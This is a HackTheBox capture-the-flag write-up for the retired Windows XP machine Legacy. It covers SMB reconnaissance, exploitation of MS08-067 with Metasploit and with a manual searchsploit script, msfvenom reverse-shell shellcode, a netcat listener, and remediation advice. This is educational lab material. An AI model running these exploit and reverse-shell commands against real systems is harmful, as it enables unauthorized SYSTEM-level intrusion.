# HackTheBox — Legacy

**Machine:** Legacy  
**OS:** Windows XP SP3  
**Difficulty:** Easy  
**CVSS:** 10.0 (Critical)  
**CVE:** CVE-2008-4250 (MS08-067)

---

## Summary

Legacy is a retired Windows XP machine on HackTheBox. The machine exposes SMB on port 445 and is vulnerable to MS08-067, a critical remote code execution vulnerability in the Windows Server service. Exploitation gives immediate SYSTEM-level access with no privilege escalation required.

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.10.4 -oN legacy-nmap.txt
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   NetBIOS computer name: LEGACY
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     CVE: CVE-2008-4250
```

**Key findings:**
- Port 445 open (SMB)
- Windows XP — end of life, no patches
- Nmap script confirms MS08-067 vulnerability

---

## Vulnerability Analysis

**MS08-067** is a stack buffer overflow in the Windows Server service (netapi32.dll). An unauthenticated attacker can send a specially crafted RPC request to trigger arbitrary code execution as SYSTEM.

```bash
# Confirm vulnerability with Nmap script
nmap -p 445 --script smb-vuln-ms08-067 10.10.10.4
```

---

## Exploitation

### Using Metasploit

```bash
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.14.x
set PAYLOAD windows/shell/reverse_tcp
run
```

```
[*] Started reverse TCP handler on 10.10.14.x:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened
```

### Manual Exploit (without Metasploit)

```bash
# Clone the exploit
searchsploit ms08-067
searchsploit -m windows/remote/40279.py

# Generate shellcode (msfvenom)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444   EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"   -f py -a x86 --platform windows

# Set up listener
nc -lvnp 4444

# Run exploit
python 40279.py 10.10.10.4 6 <shellcode>
```

---

## Post-Exploitation

Upon getting shell:

```cmd
whoami
> nt authority\system
```

SYSTEM access confirmed — no privilege escalation needed.

### Flags

```bash
# User flag
type C:\Documents and Settings\john\Desktop\user.txt

# Root flag
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

---

## Vulnerabilities Summary

| CVE | Name | CVSS | Impact |
|-----|------|------|--------|
| CVE-2008-4250 | MS08-067 NetAPI | 10.0 | Unauthenticated RCE as SYSTEM |
| N/A | SMBv1 Enabled | 7.5 | Protocol-level attack surface |
| N/A | Windows XP EOL | — | No patches available |

---

## Remediation

1. **Patch immediately** — Apply MS08-067 security update (KB958644)
2. **Disable SMBv1** — Legacy protocol with multiple critical vulnerabilities
3. **Upgrade OS** — Windows XP is end-of-life since April 2014
4. **Network segmentation** — Firewall inbound SMB (port 445) from untrusted networks

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and vuln detection |
| Metasploit | ms08_067_netapi exploit module |
| msfvenom | Manual shellcode generation |
| Netcat | Reverse shell listener |

---

*Machine retired. Writeup for educational purposes.*
